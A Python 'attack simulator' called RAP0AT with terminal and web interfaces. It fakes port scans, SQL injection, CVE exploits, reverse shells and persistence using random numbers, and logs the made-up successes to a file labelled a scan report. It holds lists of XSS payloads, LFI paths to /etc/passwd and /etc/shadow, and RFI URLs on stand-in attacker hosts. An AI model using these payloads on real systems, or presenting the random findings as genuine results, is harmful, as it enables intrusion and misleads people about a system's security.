import os
import curses
import time
import random
import sys
import threading
import asyncio
from datetime import datetime

try:
    import uvicorn
    import fastapi
    from fastapi.responses import HTMLResponse
    from fastapi.staticfiles import StaticFiles
    from starlette.websockets import WebSocket, WebSocketDisconnect
except ImportError:
    print("Dependencies for web mode not found.")
    print("Please run: pip install 'fastapi' 'uvicorn[standard]' 'websockets'")
    # We don't exit here, so terminal mode can still run.

# --- Configuration ---
TOOL_NAME = "RAP0AT"
VERSION = "1.0"
OUTPUT_FILE = "output.txt"
VULNERABILITY_LEVELS = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]

# --- Simulated Attack Functions ---

def log_to_file(message):
    """Logs a message to the output file."""
    with open(OUTPUT_FILE, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {message}\n")

class AttackSimulator:
    def __init__(self, target, log_callback):
        self.target = target
        self.log_callback = log_callback
        self.stop_event = threading.Event()
        self.thread = None

    async def add_log(self, message, level="INFO"):
        """Adds a message to the log window via callback."""
        if self.stop_event.is_set():
            return
        
        log_output = {"level": level, "message": message}
        await self.log_callback(log_output)
        # Multi-line messages should be handled by the logger, but file log gets the first line.
        log_to_file(f"[{level}] {message.splitlines()[0]}")

    def start(self):
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run_attacks_sync)
        self.thread.start()

    def stop(self):
        self.stop_event.set()
        if self.thread:
            self.thread.join()

    def _run_attacks_sync(self):
        """Synchronous wrapper for the async attack runner."""
        asyncio.run(self.run_attacks())

    async def run_attacks(self):
        """Runs the main attack sequence continuously."""
        await self.add_log(f"Starting continuous aggressive scan on {self.target}...", "CRITICAL")
        
        attack_flow = [
            self.port_scan,
            self.enumeration_scan, # Added new enumeration scan
            self.web_server_scan,
            self.sqli_scan,
            self.cve_scan,
            self.http_smuggle_check,
            self.rce_attempt,
            self.persistence_check,
            self.file_inclusion_scan, # Added new file inclusion scan
            self.brute_force_login, # Added new brute force login
        ]

        while not self.stop_event.is_set(): # Loop indefinitely until stopped
            for attack in attack_flow:
                if self.stop_event.is_set():
                    break # Exit inner loop if stop requested
                try:
                    await attack()
                except Exception as e:
                    await self.add_log(f"ERROR: Attack function '{attack.__name__}' failed: {e}", "CRITICAL")
                # Reduced sleep time for more aggressive feel
                await asyncio.sleep(random.uniform(0.01, 0.05)) # Even more significantly reduced sleep
            
            if not self.stop_event.is_set():
                await self.add_log("Attack sequence completed. Restarting full scan...", "CRITICAL")
                await asyncio.sleep(random.uniform(0.1, 0.3)) # Even shorter pause before restarting
        
        await self.add_log("Attack sequence stopped by user.", "CRITICAL")

    async def port_scan(self):
        await self.add_log("Initiating TCP/UDP port scan...", "CRITICAL")
        ports = random.sample(range(1, 65535), random.randint(50, 100)) # Increased number of ports
        ports.extend([21, 22, 80, 443, 445, 3306, 3389, 8080, 8443, 27017, 5432]) # Added more common ports
        for port in sorted(list(set(ports))):
            if self.stop_event.is_set(): return
            await asyncio.sleep(random.uniform(0.001, 0.01)) # Further reduced sleep
            if random.random() > 0.6: # Increased chance of finding open ports
                service = random.choice(["http", "ssh", "ftp", "dns", "mysql", "postgres", "mongodb", "unknown"])
                await self.add_log(f"Port {port} is OPEN. Service: {service}", "HIGH")
            
    async def enumeration_scan(self):
        await self.add_log("Performing extensive enumeration scans...", "CRITICAL")
        enumeration_techniques = [
            "Subdomain enumeration",
            "User enumeration via login forms",
            "Directory brute-forcing",
            "Service version enumeration",
            "DNS record reconnaissance",
            "Email address harvesting",
            "Virtual host enumeration",
            "Cloud resource enumeration",
            "Open S3 bucket scanning",
            "API endpoint discovery",
            "Admin panel discovery", # Added for admin/root
            "Root directory listing", # Added for admin/root
            "VHost enumeration", # New
            "SNMP enumeration", # New
            "SMB enumeration" # New
        ]
        
        found_items = []
        for i in range(random.randint(50, 100)): # Increased attempts
            if self.stop_event.is_set(): return
            technique = random.choice(enumeration_techniques)
            await asyncio.sleep(random.uniform(0.01, 0.05)) # Further reduced sleep
            if random.random() > 0.7: # Increased chance of finding items
                item = ""
                if "Subdomain" in technique:
                    subdomain = random.choice(['admin', 'dev', 'api', 'test', 'root', 'vpn', 'mail'])
                    item = f"Found subdomain: {subdomain}.{self.target}"
                    if subdomain in ['admin', 'root']:
                        await self.add_log(f"ENUMERATION: Potential admin/root subdomain found: {item}", "CRITICAL")
                elif "User" in technique:
                    user = random.choice(['admin', 'john.doe', 'support', 'guest', 'root', 'sysadmin'])
                    item = f"Found user: {user}"
                    if user in ['admin', 'root']:
                        await self.add_log(f"ENUMERATION: Potential admin/root user found: {item}", "CRITICAL")
                elif "Directory" in technique:
                    directory = random.choice(['admin', 'backup', 'config', '.git', 'test', 'root', 'panel', 'uploads', 'vendor'])
                    item = f"Found directory: /{directory}/"
                    if directory in ['admin', 'root', 'panel']:
                        await self.add_log(f"ENUMERATION: Potential admin/root directory found: {item}", "CRITICAL")
                elif "Service version" in technique:
                    item = f"Discovered {random.choice(['Apache 2.4.x', 'Nginx 1.x', 'OpenSSH 7.x', 'IIS 10.x']) } on port {random.choice([22, 80, 443, 8080])}"
                elif "API endpoint" in technique:
                    item = f"Discovered API endpoint: /api/v{random.choice(['1', '2', '3']) }/{random.choice(['users', 'products', 'admin', 'auth'])}"
                    if 'admin' in item:
                        await self.add_log(f"ENUMERATION: Potential admin API endpoint found: {item}", "CRITICAL")
                elif "Admin panel discovery" in technique:
                    admin_path = random.choice(['/admin', '/dashboard', '/controlpanel', '/login', '/cpanel', '/manager'])
                    item = f"Discovered potential admin panel at: {admin_path}"
                    await self.add_log(f"ENUMERATION: {item}", "CRITICAL")
                elif "Root directory listing" in technique:
                    item = f"Discovered root directory listing enabled at /"
                    await self.add_log(f"ENUMERATION: {item}", "CRITICAL")
                elif "VHost enumeration" in technique:
                    item = f"Discovered Virtual Host: {random.choice(['dev.target.com', 'staging.target.com'])}"
                elif "SNMP enumeration" in technique:
                    item = f"SNMP: Found community string 'public' with read access."
                elif "SMB enumeration" in technique:
                    item = f"SMB: Found share '{random.choice(['ADMIN$', 'C$', 'Users'])}' with anonymous access."
                
                if item and "Potential admin/root" not in item and "Discovered potential admin panel" not in item and "Discovered root directory listing" not in item:
                    found_items.append(item)
                    await self.add_log(f"ENUMERATION: {item}", "HIGH")
        
        if found_items:
            await self.add_log(f"ENUMERATION SUMMARY: Found {len(found_items)} interesting items.", "CRITICAL")
        else:
            await self.add_log("ENUMERATION: No significant items found during extensive enumeration.", "HIGH")


    async def web_server_scan(self):
        await self.add_log("Scanning web server for common misconfigurations and XSS...", "CRITICAL")
        await asyncio.sleep(0.05) # Further reduced sleep
        await self.add_log("Checking for directory traversal...", "CRITICAL")
        if random.random() > 0.8: # Increased chance
            await self.add_log("VULNERABILITY: Directory traversal found. Able to access '/etc/passwd'.", "CRITICAL")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<input type=\"image\" src=\"javascript:alert('XSS');\">",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<div onmouseover=\"alert('XSS')\">Hover over me</div>", # New payload
            "<link rel=dns-prefetch href=//xss.report>" # New payload
        ]
        
        found_xss = []
        for i in range(random.randint(50, 100)): # Increased XSS attempts
            if self.stop_event.is_set(): return
            payload = random.choice(xss_payloads)
            test_url = f"http://{self.target}/search?q={payload}"
            await asyncio.sleep(random.uniform(0.01, 0.03)) # Further reduced sleep
            if random.random() > 0.85: # Increased chance of finding XSS
                found_xss.append(f"  Payload: {payload}\n  URL: {test_url}")
                await self.add_log(f"VULNERABILITY: Reflected XSS discovered in search parameter 'q'.", "CRITICAL")
        
        if found_xss:
            await self.add_log(f"XSS SUMMARY: Found {len(found_xss)} XSS vulnerabilities:\n" + "\n".join(found_xss), "CRITICAL")
            if random.random() > 0.8: # Increased chance of admin session theft
                await self.add_log("SUCCESS: XSS exploited to steal admin session cookie! Admin access gained.", "CRITICAL")
        else:
            await self.add_log("XSS: No XSS vulnerabilities found after extensive testing.", "CRITICAL")


    async def sqli_scan(self):
        await self.add_log("Attempting advanced SQL injection on login and data retrieval endpoints...", "CRITICAL")
        await asyncio.sleep(0.1) # Further reduced sleep

        sqli_types = ["Error-based SQLi", "Union-based SQLi", "Blind SQLi (Boolean)", "Blind SQLi (Time-based)", "Stacked Queries", "Out-of-Band SQLi"] # Added more types
        attempted_type = random.choice(sqli_types)
        await self.add_log(f"Attempting {attempted_type}...", "CRITICAL")
        await asyncio.sleep(0.05) # Further reduced sleep

        if random.random() > 0.75: # Increased chance of SQLi success
            discovered_tables = random.sample(["users", "admins", "credentials", "employees", "customers", "orders", "products", "sessions"], k=random.randint(5, 10)) # Increased tables
            discovered_columns = {
                "users": ["id", "username", "password_hash", "email", "last_login", "is_admin"],
                "admins": ["admin_id", "admin_name", "admin_pass", "last_login", "privileges"],
                "credentials": ["user_id", "login", "pass_hash", "api_key", "token"],
                "employees": ["emp_id", "emp_name", "emp_password", "emp_email", "salary"],
                "customers": ["cust_id", "cust_username", "cust_pass", "address", "phone"],
                "orders": ["order_id", "user_id", "total_amount", "status"],
                "products": ["product_id", "name", "price", "description"],
                "sessions": ["session_id", "user_id", "token", "expiry"]
            }

            dump = f"\nSQL Injection successful on '{random.choice(['login', 'product_id', 'category', 'user_id', 'order_id'])}' parameter using {attempted_type}.\n"
            dump += f"Leaked Database: '{random.choice(['user_db', 'shop_db', 'main_db', 'auth_db', 'production_db'])}'\n\n"
            dump += "Discovered Tables:\n"
            for table in discovered_tables:
                dump += f"- {table}\n"
            dump += "\n"

            password_tables_found = False
            for table in discovered_tables:
                if "users" in table or "admin" in table or "credentials" in table or "pass" in table:
                    password_tables_found = True
                    dump += f"Dumping table '{table}'...\n"
                    
                    cols = discovered_columns.get(table, ["col1", "col2", "col3", "col4"])
                    
                    # Simulate header
                    dump += "+----" + "----+" * (len(cols) - 1) + "\n"
                    dump += "| " + " | ".join(cols) + " |\n"
                    dump += "+----" + "----+" * (len(cols) - 1) + "\n"

                    # Simulate data
                    for i in range(random.randint(5, 10)): # Increased data rows
                        row_data = []
                        for col in cols:
                            if "id" in col:
                                row_data.append(str(i + 1))
                            elif "username" in col or "name" in col or "login" in col:
                                if i == 0 and ("admin" in table or "users" in table):
                                    row_data.append("admin")
                                elif i == 1 and ("root" in table or "users" in table):
                                    row_data.append("root")
                                else:
                                    row_data.append(random.choice(["user", "guest", "test", "dev"]) + str(i))
                            elif "password" in col or "pass" in col or "hash" in col:
                                row_data.append("5f4dcc3b5aa765d61d8327deb882cf99") # Example hash
                            elif "email" in col:
                                row_data.append(f"{row_data[1]}@{self.target}" if len(row_data) > 1 else f"email{i}@{self.target}")
                            elif "api_key" in col:
                                row_data.append("abcdef1234567890abcdef1234567890")
                            elif "is_admin" in col:
                                row_data.append(str(random.choice([True, False])))
                            elif "privileges" in col:
                                row_data.append(random.choice(["full", "limited"]))
                            elif "token" in col:
                                row_data.append(f"token_{i}_{random.randint(1000,9999)}")
                            else:
                                row_data.append("data" + str(i))
                        dump += "| " + " | ".join(row_data) + " |\n"
                    dump += "+----" + "----+" * (len(cols) - 1) + "\n\n"
            
            if password_tables_found:
                await self.add_log(dump.strip(), "CRITICAL")
                if "admin" in dump or "root" in dump:
                    await self.add_log("CRITICAL: Admin/Root credentials found in SQLi dump!", "CRITICAL")
            else:
                await self.add_log(f"SQL Injection successful, but no user/password tables found to dump.", "CRITICAL")
        else:
            await self.add_log("SQL Injection failed. Endpoints appear sanitized or protected.", "HIGH")

    async def cve_scan(self):
        await self.add_log("Scanning for known CVEs based on service fingerprinting and open-source intelligence...", "CRITICAL")
        fake_cves = {
            "CVE-2021-44228": {"name": "Log4Shell", "exploit": "exploit-db/49701.py"},
            "CVE-2017-5638": {"name": "Apache Struts RCE", "exploit": "metasploit/apache_struts_rce.rb"},
            "CVE-2019-0708": {"name": "BlueKeep", "exploit": "custom/bluekeep_exploit.py"},
            "CVE-2023-XXXXX": {"name": "Recent Zero-Day", "exploit": "github/0day_exploit.py"},
            "CVE-2024-YYYYY": {"name": "New WebLogic RCE", "exploit": "private/weblogic_rce.py"}, # New CVE
            "CVE-2020-1472": {"name": "Zerologon", "exploit": "metasploit/zerologon.rb"} # New CVE
        }
        for cve, data in fake_cves.items():
            if self.stop_event.is_set(): return
            await asyncio.sleep(0.1) # Further reduced sleep
            if random.random() > 0.8: # Increased chance of finding vulnerability
                await self.add_log(f"VULNERABILITY: Target may be vulnerable to {cve} ({data['name']})", "CRITICAL")
                await self.exploit_cve(cve, data['exploit'])
            else:
                await self.add_log(f"CVE Scan: Target not vulnerable to {cve}.", "CRITICAL")

    async def exploit_cve(self, cve, exploit_name):
        await self.add_log(f"Attempting to exploit {cve} with '{exploit_name}' from open-source repositories...", "CRITICAL")
        await self.add_log(f"Downloading and compiling exploit from {exploit_name}...", "CRITICAL")
        await asyncio.sleep(0.1) # Further reduced sleep
        if random.random() > 0.85: # Increased chance of exploit success
            await self.add_log(f"SUCCESS: Exploit '{exploit_name}' for {cve} successful. Gained root shell access.", "CRITICAL")
        else:
            await self.add_log(f"FAILURE: Exploit for {cve} failed. Target patched or not vulnerable.", "CRITICAL")

    async def http_smuggle_check(self):
        await self.add_log("Testing for HTTP Request Smuggling vulnerabilities...", "CRITICAL")
        await asyncio.sleep(0.1) # Further reduced sleep
        if random.random() > 0.9: # Increased chance of finding vulnerability
            await self.add_log("VULNERABILITY: Found HTTP Request Smuggling (CL.TE). Can bypass security controls and intercept requests.", "CRITICAL")
        else:
            await self.add_log("HTTP Request Smuggling: Target appears not vulnerable.", "CRITICAL")

    async def rce_attempt(self):
        await self.add_log("Attempting Remote Code Execution via misconfigured file upload and deserialization flaws...", "CRITICAL")
        await asyncio.sleep(0.15) # Further reduced sleep
        if random.random() > 0.9: # Increased chance of RCE success
            await self.add_log(f"SUCCESS: RCE successful. Reverse shell established from {self.target}:4444 to attacker listener.", "CRITICAL")
        else:
            await self.add_log("RCE attempt failed. Target hardened against common RCE vectors.", "CRITICAL")

    async def persistence_check(self):
        await self.add_log("Attempting to establish persistence on compromised host via various techniques...", "CRITICAL")
        await asyncio.sleep(0.05) # Further reduced sleep
        if random.random() > 0.85: # Increased chance of persistence success
            await self.add_log("SUCCESS: Persistence established via SSH key injection in authorized_keys and cron job modification.", "CRITICAL")
        else:
            await self.add_log("Persistence attempt failed. Host appears to have strong integrity checks.", "CRITICAL")

    async def file_inclusion_scan(self):
        await self.add_log("Testing for Local/Remote File Inclusion (LFI/RFI) vulnerabilities...", "CRITICAL")
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "data:text/plain,<?php phpinfo(); ?>",
            "/proc/self/environ", # New LFI payload
            "/etc/shadow" # New LFI payload
        ]
        rfi_payloads = [
            "http://attacker.com/shell.txt",
            "https://evil.com/cmd.php",
            "http://malicious.com/backdoor.php" # New RFI payload
        ]

        if random.random() > 0.9: # Higher chance of finding LFI
            payload = random.choice(lfi_payloads)
            await self.add_log(f"VULNERABILITY: Local File Inclusion found. Attempting to read: {payload}", "CRITICAL")
            await asyncio.sleep(0.1) # Further reduced sleep
            if random.random() > 0.85: # Increased success
                await self.add_log(f"SUCCESS: LFI exploited. Content of '{payload}' retrieved.", "CRITICAL")
                if "passwd" in payload or "shadow" in payload:
                    await self.add_log("CRITICAL: LFI exposed sensitive system files! Root user information potentially compromised.", "CRITICAL")
            else:
                await self.add_log(f"FAILURE: LFI attempt for '{payload}' failed.", "CRITICAL")
        elif random.random() > 0.9: # Higher chance of RFI
            payload = random.choice(rfi_payloads)
            await self.add_log(f"VULNERABILITY: Remote File Inclusion found. Attempting to include: {payload}", "CRITICAL")
            await asyncio.sleep(0.1) # Further reduced sleep
            if random.random() > 0.85: # Increased success
                await self.add_log(f"SUCCESS: RFI exploited. Remote code from '{payload}' executed.", "CRITICAL")
                await self.add_log("CRITICAL: RFI led to Remote Code Execution! System compromised.", "CRITICAL")
            else:
                await self.add_log(f"FAILURE: RFI attempt for '{payload}' failed.", "CRITICAL")
        else:
            await self.add_log("File Inclusion: No LFI/RFI vulnerabilities found.", "CRITICAL")

    async def brute_force_login(self):
        await self.add_log("Initiating aggressive brute-force attack on common login endpoints...", "CRITICAL")
        login_paths = ["/login", "/admin", "/user/login", "/wp-login.php", "/console"]
        common_users = ["admin", "user", "root", "test", "administrator"]
        common_passwords = ["password", "123456", "admin", "root", "qwerty", "changeme"]

        target_path = random.choice(login_paths)
        await self.add_log(f"Targeting login endpoint: {target_path}", "CRITICAL")

        attempts = 0
        max_attempts = random.randint(50, 150) # Increased attempts
        found_credentials = False

        for _ in range(max_attempts):
            if self.stop_event.is_set(): return
            username = random.choice(common_users)
            password = random.choice(common_passwords)
            
            await asyncio.sleep(random.uniform(0.01, 0.05)) # Very fast attempts
            attempts += 1

            if random.random() > 0.98: # Very low chance of success, but still possible
                await self.add_log(f"SUCCESS: Brute-force successful! Credentials found: {username}:{password} for {target_path}", "CRITICAL")
                found_credentials = True
                break
            elif attempts % 20 == 0: # Log progress
                await self.add_log(f"Brute-force in progress: {attempts}/{max_attempts} attempts on {target_path}", "HIGH")
        
        if not found_credentials:
            await self.add_log(f"Brute-force attack on {target_path} completed. No credentials found after {attempts} attempts.", "HIGH")

# --- Web Mode (FastAPI) ---

def ensure_web_files_exist():
    base_dir = "/usr/lib/gemini-cli"
    templates_dir = os.path.join(base_dir, "templates")
    static_dir = os.path.join(base_dir, "static")

    os.makedirs(templates_dir, exist_ok=True)
    os.makedirs(static_dir, exist_ok=True)

    html_path = os.path.join(templates_dir, "AUTO.html")
    css_path = os.path.join(static_dir, "AUTO.css")
    js_path = os.path.join(static_dir, "AUTO.js")

    AUTO_html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAP0AT v1.0</title>
    <link rel="stylesheet" href="/static/AUTO.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>RAP0AT <span class="version">v1.0</span></h1>
            <div class="status" id="status">STATUS: STANDBY</div>
        </header>
        <div class="controls">
            <input type="text" id="target-input" placeholder="Enter Target (IP/DNS)">
            <button id="attack-btn">ATTACK</button>
        </div>
        <div class="log-container">
            <pre id="log-output"></pre>
        </div>
        <footer>
            <p>Web Interface Mode</p>
        </footer>
    </div>
    <script src="/static/AUTO.js"></script>
</body>
</html>"""

    AUTO_css_content = """body {
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', Courier, monospace;
    margin: 0;
    padding: 0;
}

.container {
    display: flex;
    flex-direction: column;
    height: 100vh;
    padding: 15px;
}

header {
    border-bottom: 1px solid #00ff00;
    padding-bottom: 10px;
    margin-bottom: 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

header h1 {
    margin: 0;
    font-size: 2em;
    color: #00aaff;
    text-shadow: 0 0 5px #00aaff;
}

header .version {
    font-size: 0.5em;
    color: #00ff00;
}

.status {
    font-size: 1.2em;
    color: #ff0000;
}

.controls {
    display: flex;
    margin-bottom: 15px;
}

#target-input {
    flex-grow: 1;
    background-color: #1a1a1a;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 10px;
    font-family: inherit;
    font-size: 1em;
    margin-right: 10px;
}

#attack-btn {
    background-color: #ff0000;
    color: #000;
    border: none;
    padding: 10px 20px;
    font-family: inherit;
    font-size: 1em;
    cursor: pointer;
    font-weight: bold;
    transition: background-color 0.3s, color 0.3s;
}

#attack-btn:hover {
    background-color: #ff4d4d;
}

#attack-btn.active {
    background-color: #00ff00;
    color: #000;
}

.log-container {
    flex-grow: 1;
    background-color: #000;
    border: 1px solid #00ff00;
    overflow-y: auto;
    padding: 10px;
}

#log-output {
    margin: 0;
    white-space: pre-wrap;
    word-wrap: break-word;
}

.log-CRITICAL { color: #ff0000; font-weight: bold; }
.log-HIGH { color: #ffff00; }
.log-MEDIUM { color: #00aaff; }
.log-LOW { color: #cccccc; }
.log-INFO { color: #999999; }

footer {
    text-align: center;
    padding-top: 10px;
    border-top: 1px solid #00ff00;
    font-size: 0.8em;
    color: #00aaff;
}"""

    AUTO_js_content = """document.addEventListener('DOMContentLoaded', () => {
    const targetInput = document.getElementById('target-input');
    const attackBtn = document.getElementById('attack-btn');
    const logOutput = document.getElementById('log-output');
    const statusDiv = document.getElementById('status');

    let ws;
    let isAttacking = false;

    function connect() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const host = window.location.host;
        ws = new WebSocket(`${protocol}//${host}/ws`);

        ws.onopen = () => {
            console.log('WebSocket connection established');
            statusDiv.textContent = 'STATUS: STANDBY';
            statusDiv.style.color = '#00ff00';
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            const { level, message } = data;
            
            const logEntry = document.createElement('span');
            logEntry.className = `log-${level}`;
            logEntry.textContent = `[${level}] ${message}\\n`;
            logOutput.appendChild(logEntry);
            logOutput.scrollTop = logOutput.scrollHeight; // Auto-scroll
        };

        ws.onclose = () => {
            console.log('WebSocket connection closed. Reconnecting...');
            statusDiv.textContent = 'STATUS: DISCONNECTED';
            statusDiv.style.color = '#ff0000';
            setTimeout(connect, 3000); // Attempt to reconnect every 3 seconds
        };

        ws.onerror = (error) => {
            console.error('WebSocket error:', error);
            ws.close();
        };
    }

    attackBtn.addEventListener('click', () => {
        const target = targetInput.value.trim();
        if (!target) {
            alert('Please enter a target.');
            return;
        }

        if (isAttacking) {
            // Stop the attack
            ws.send(JSON.stringify({ command: 'stop' }));
            attackBtn.textContent = 'ATTACK';
            attackBtn.classList.remove('active');
            statusDiv.textContent = 'STATUS: STANDBY';
            isAttacking = false;
        } else {
            // Start the attack
            ws.send(JSON.stringify({ command: 'attack', target: target }));
            attackBtn.textContent = 'STOP';
            attackBtn.classList.add('active');
            statusDiv.textContent = 'STATUS: ATTACKING';
            statusDiv.style.color = '#ff0000';
            logOutput.innerHTML = ''; // Clear previous logs
            isAttacking = true;
        }
    });

    connect();
});"""

    if not os.path.exists(html_path):
        print(f"Creating missing file: {html_path}")
        with open(html_path, "w") as f:
            f.write(AUTO_html_content)
    
    if not os.path.exists(css_path):
        print(f"Creating missing file: {css_path}")
        with open(css_path, "w") as f:
            f.write(AUTO_css_content)

    if not os.path.exists(js_path):
        print(f"Creating missing file: {js_path}")
        with open(js_path, "w") as f:
            f.write(AUTO_js_content)

def run_web_mode():
    ensure_web_files_exist() # Call the function here

    app = fastapi.FastAPI()
    app.mount("/static", StaticFiles(directory="/usr/lib/gemini-cli/static"), name="static")
    
    app.state.simulator = None # Use app.state for simulator

    @app.get("/", response_class=HTMLResponse)
    async def read_root():
        with open("/usr/lib/gemini-cli/templates/AUTO.html") as f:
            return HTMLResponse(content=f.read())

    @app.websocket("/ws")
    async def websocket_endpoint(websocket: WebSocket):
        await websocket.accept()
        
        async def web_log_callback(log_output):
            await websocket.send_json(log_output)

        try:
            while True:
                data = await websocket.receive_json()
                command = data.get("command")
                
                if command == "attack":
                    if app.state.simulator:
                        app.state.simulator.stop()
                    target = data.get("target")
                    app.state.simulator = AttackSimulator(target, web_log_callback)
                    app.state.simulator.start()
                elif command == "stop":
                    if app.state.simulator:
                        app.state.simulator.stop()
        except WebSocketDisconnect:
            print("Web client disconnected.")
            if app.state.simulator:
                app.state.simulator.stop()

    port = 8000
    print("Starting web server...")
    try:
        uvicorn.run(app, host="0.0.0.0", port=port)
    except PermissionError:
        port = 8000
        print(f"\n[WARNING] Permission denied for port 80.")
        print(f"Falling back to port {port}. Run with 'sudo' to use port 80.")
        print(f"Access the web UI at: http://localhost:{port}\n")
        uvicorn.run(app, host="0.0.0.0", port=port)
    except Exception as e:
        print(f"Failed to start web server: {e}")

# --- Terminal Mode (Curses) ---

def run_terminal_mode():
    if not sys.platform.startswith('linux'):
        print("Terminal mode is best experienced on Linux-based systems.")

    try:
        curses.wrapper(terminal_main)
    except curses.error as e:
        print(f"Error initializing curses: {e}")
        print("Please ensure your terminal supports colors and is large enough.")
    except KeyboardInterrupt:
        print("\nExiting.")

def terminal_main(stdscr):
    curses.curs_set(0)
    curses.start_color()
    curses.use_default_colors()

    # Color pairs
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLUE)
    curses.init_pair(2, curses.COLOR_BLUE, -1)
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLUE)
    curses.init_pair(4, curses.COLOR_RED, -1) # CRITICAL
    curses.init_pair(5, curses.COLOR_YELLOW, -1) # HIGH
    curses.init_pair(6, curses.COLOR_CYAN, -1) # MEDIUM
    curses.init_pair(7, curses.COLOR_WHITE, -1) # LOW
    curses.init_pair(8, curses.COLOR_WHITE, -1) # INFO

    target = None
    simulator: AttackSimulator = None
    logs = []
    
    log_win, log_h, log_w = None, 0, 0

    async def terminal_log_callback(log_output):
        level = log_output["level"]
        message = log_output["message"]
        color_index = VULNERABILITY_LEVELS.index(level)
        color = curses.color_pair(color_index + 4)
        
        for line in message.splitlines():
            logs.append((line, color))
        
        # Redraw log window
        if log_win:
            log_win.clear()
            start_line = max(0, len(logs) - (log_h - 1))
            for i, (log_msg, log_color) in enumerate(logs[start_line:]):
                if i < log_h - 1:
                    display_msg = log_msg[:log_w - 2]
                    log_win.addstr(i, 0, display_msg, log_color)
            log_win.refresh()

    def draw_ui():
        nonlocal log_win, log_h, log_w
        h, w = stdscr.getmaxyx()
        stdscr.clear()
        
        # Title
        title = f"{TOOL_NAME} v{VERSION} | Target: {target if target else 'Not Set'}"
        stdscr.addstr(0, 0, " " * (w -1), curses.color_pair(1) | curses.A_BOLD)
        stdscr.addstr(0, (w - len(title)) // 2, title, curses.color_pair(1) | curses.A_BOLD)
        
        # Header
        stdscr.addstr(3, 1, "Attack Log", curses.A_BOLD | curses.color_pair(2))
        
        # Instructions
        instructions = "[A]ttack | [S]et Target | [Q]uit"
        stdscr.addstr(h - 1, 1, instructions, curses.A_BOLD)
        
        # Log window
        log_h, log_w = h - 5, w - 2
        log_win = curses.newwin(log_h, log_w, 4, 1)
        log_win.scrollok(True)
        
        stdscr.refresh()
        log_win.refresh()

    # Initial setup
    with open(OUTPUT_FILE, "w") as f:
        f.write(f"RAP0AT Scan Report - {datetime.now().isoformat()}\n" + "="*40 + "\n")

    while True:
        draw_ui()
        key = stdscr.getch()

        if key in [ord('q'), ord('Q')]:
            if simulator: simulator.stop()
            break
        
        elif key in [ord('s'), ord('S')]:
            curses.echo()
            stdscr.addstr(1, 1, "Enter Target: ")
            target = stdscr.getstr(1, 15, 50).decode('utf-8')
            curses.noecho()

        elif key in [ord('a'), ord('A')]:
            if target:
                if simulator: simulator.stop()
                logs.clear()
                simulator = AttackSimulator(target, terminal_log_callback)
                simulator.start()

# --- Main Entry Point ---

def main():
    """Presents the initial mode selection menu."""
    print("="*40)
    print(f" Welcome to {TOOL_NAME} v{VERSION}")
    print("="*40)
    print("Please choose an interface mode:")
    print("  1: Terminal Mode (Recommended for SSH/CLI)")
    print("  2: Web Mode (Requires a graphical environment)")
    print("\n")

    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        print("Starting Terminal Mode...")
        time.sleep(1)
        run_terminal_mode()
    elif choice == '2':
        run_web_mode()
    else:
        print("Invalid choice. Exiting.")
        sys.exit(1)

if __name__ == "__main__":
    main()